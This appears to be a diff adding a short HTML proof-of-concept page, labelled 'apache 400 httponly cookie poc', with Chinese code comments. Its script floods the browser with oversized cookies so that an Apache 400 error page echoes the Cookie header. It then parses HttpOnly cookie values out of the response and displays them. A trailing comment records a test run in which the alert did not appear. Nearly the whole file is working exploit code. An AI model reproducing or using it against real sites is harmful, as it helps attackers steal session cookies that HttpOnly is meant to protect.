@@ -1,0 +1,74 @@
+<html>
+
+<body>
+<script type="text/javascript">
+
+function setCookies(good){
+
+	var str ="";
+	for (var i = 0; i < 819; i++) {
+		str += 'x';
+	}
+	for (i = 0 ; i < 10; i++){//清理cookie
+		if (good){
+			var cookie = 'xss'+i+'=;expires='+new Date(+new Date()-1).toUTCString()+'; path=/;';	
+		}else{
+			var cookie = 'xss'+i+'='+str+';path=/;';
+		}
+		document.cookie = cookie;
+	}
+}
+function makeRequest(){
+	setCookies();
+
+	function parseCookies(){
+		var cookie_dict = {};
+		if (xhr.readyState === 4 && xhr.status === 400){
+			var content = xhr.responseText.replace(/\r|\n/g, '').match(/<pre>(.+)<\/pre>/);
+
+			if (content.length){
+				content = content[0].replace('Cookie: ', '');
+				var cookies = content.replace(/xss\d=x+;?/g, '').split(/;/g);
+
+				for (var i=0; i<cookies.length; i++){
+					var s_c = cookies[i].split('=',2);
+					cookie_dict[s_c[0]] = s_c[1];
+				}
+			}
+			setCookies(true);
+			alert(JSON.stringify(cookie_dict));
+		}
+
+	}
+	//针对目标页面发送请求并带上垃圾Cookie
+	var xhr = new XMLHttpRequest();
+	xhr.onreadystatechange = parseCookies;
+	xhr.open('GET', 'httponly_setcookie.php', true);
+	xhr.send(null);
+}
+
+makeRequest();
+</script>
+
+
+apache 400 httponly cookie poc
+</body>
+
+<!-- 
+reuslt :
+
+Bad Request
+
+Your browser sent a request that this server could not understand.
+Size of a request header field exceeds server limit.
+Cookie
+/n
+Apache/2 Server at localhost Port 80
+
+
+============================================
+
+no alert()?!!
+
+-->
+</html>
